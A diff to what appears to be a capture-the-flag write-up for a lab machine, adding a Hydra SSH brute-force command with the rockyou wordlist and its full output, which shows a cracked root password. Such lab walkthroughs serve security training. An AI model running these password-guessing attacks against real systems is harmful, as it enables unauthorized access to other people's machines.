@@ -83,8 +83,32 @@ root@kali:/usr/share/wordlists# gunzip rockyou.txt.gz
 ```bash
 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.211.151
 ```
+- results should return with root password:
+```
+root@kali:/usr/share/wordlists# hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.211.151
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
-## John and Hashcat
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-23 11:05:16
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://10.10.211.151:22/
+[STATUS] 180.00 tries/min, 180 tries in 00:01h, 14344223 to do in 1328:11h, 16 active
+[STATUS] 139.33 tries/min, 418 tries in 00:03h, 14343985 to do in 1715:48h, 16 active
+[STATUS] 117.14 tries/min, 820 tries in 00:07h, 14343583 to do in 2040:46h, 16 active
+
+[STATUS] 118.67 tries/min, 1780 tries in 00:15h, 14342623 to do in 2014:25h, 16 active
+
+[STATUS] 116.16 tries/min, 3601 tries in 00:31h, 14340802 to do in 2057:36h, 16 active
+[STATUS] 114.66 tries/min, 5389 tries in 00:47h, 14339014 to do in 2084:18h, 16 active
+[22][ssh] host: 10.10.211.151   login: root   password: hikari
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 4 final worker threads did not complete until end.
+[ERROR] 4 targets did not resolve or could not be connected
+[ERROR] 0 targets did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-23 12:04:12
+```
+
+## John and Hashcat Method
 refer to this writeup for the full detailed write up.
 [Anonforce Writeup](https://www.embeddedhacker.com/2019/09/hacking-walkthrough-boot2root-ctf-anonforce/)
 
